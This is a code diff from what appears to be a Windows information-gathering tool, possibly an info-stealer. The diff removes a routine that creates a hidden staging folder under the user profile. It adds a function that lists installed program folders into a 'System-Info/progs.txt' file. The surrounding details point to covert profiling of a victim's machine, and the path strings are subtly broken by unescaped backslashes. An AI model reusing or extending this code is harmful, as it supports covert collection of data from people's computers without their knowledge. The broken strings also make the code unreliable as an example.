@@ -15,44 +15,55 @@
 |                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                         |
 ==================================================================================================================|
 */
-#include "../scripts.h"
+
+#include "../targets.h"
 #include "../../config/config.h"
+
 #include <windows.h>
+#include <tlhelp32.h>
 #include <Lmcons.h>
-#include <direct.h>
-#include <string.h>
+#include <fstream>
 
-std::wstring StringToWideString(const std::string&);
-
-void manager::MakeDirs()
+void cursystem::GetProgs()
 {
-	TCHAR string[UNLEN + 1];
-	DWORD size = UNLEN + 1;
-	GetUserName((TCHAR*)string, &size);
-	std::wstring ws(string);
-	std::string userName(ws.begin(), ws.end());
-	std::string paths [2] = {
-
-		"C:/Users/" + userName + config::path,
-		"C:/Users/" + userName + config::path +"/System-Info"
-
+	std::string paths[2] = { 
+		"C:\Program Files (x86)", 
+		"C:\Program Files" 
 	};
 
+    TCHAR string[UNLEN + 1];
+    DWORD size = UNLEN + 1;
+    GetUserName((TCHAR*)string, &size);
+    std::wstring ws(string);
+    std::string userName(ws.begin(), ws.end());
 
-	std::wstring wpathto = StringToWideString(paths[0]);
+    std::string pathToFile = "C:/Users/" + userName + config::path + "/System-Info/progs.txt";
+
 	for (size_t i = 0; i < std::size(paths); i++)
 	{
-		int result = _mkdir(paths[i].c_str());
-	}
+        std::string searchPath = paths[i] + "\\*";
+        WIN32_FIND_DATAA fileData;
+        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fileData);
 
-	BOOL success = SetFileAttributes(wpathto.c_str(), FILE_ATTRIBUTE_HIDDEN);
-}
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    std::string dirName(fileData.cFileName);
 
-std::wstring StringToWideString(const std::string& str) {
+                    // Exclude "." and ".." directories
+                    if (dirName != "." && dirName != "..") {
+                        std::ofstream file(pathToFile, std::ios::app);
+                        if (file.is_open())
+                        {
+                            file << "prog name: " << dirName << std::endl;
+                        }
 
+                        file.close();
+                    }
+                }
+            } while (FindNextFileA(hFind, &fileData));
 
-	int length = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
-	std::wstring wideStr(length, 0);
-	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wideStr[0], length);
-	return wideStr;
+            FindClose(hFind);
+        }
+    }
 }
